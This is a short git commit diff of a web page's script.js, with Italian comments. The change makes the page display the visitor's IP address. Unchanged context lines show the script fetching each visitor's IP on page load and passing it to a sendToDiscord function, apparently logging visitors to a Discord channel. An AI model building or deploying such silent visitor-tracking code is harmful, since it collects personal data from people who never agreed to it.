b3bd6413c4f46cef9de2a7f8ad28c476233bfc5b
C_abgh <142695893+SebaCoderS@users.noreply.github.com>
2025-02-21 22:56:57 +0100

    script.js

--- script.js
+++ script.js
@@ -3,14 +3,12 @@ document.addEventListener("DOMContentLoaded", function() {
         .then(response => response.json())
         .then(data => {
             console.log("Your IP address is: ", data.ip);
-            // Rimuovi o commenta la linea seguente se non vuoi visualizzare l'IP sulla pagina
-            // document.getElementById('ip-address').textContent = data.ip;
+            document.getElementById('ip-address').textContent = data.ip;
             sendToDiscord(data.ip);
         })
         .catch(error => {
             console.error('Error fetching IP:', error);
-            // Rimuovi o commenta la linea seguente se non vuoi visualizzare l'errore sulla pagina
-            // document.getElementById('ip-address').textContent = 'Errore nel recupero dell\'IP';
+            document.getElementById('ip-address').textContent = 'Errore nel recupero dell\'IP';
         });
 });
 
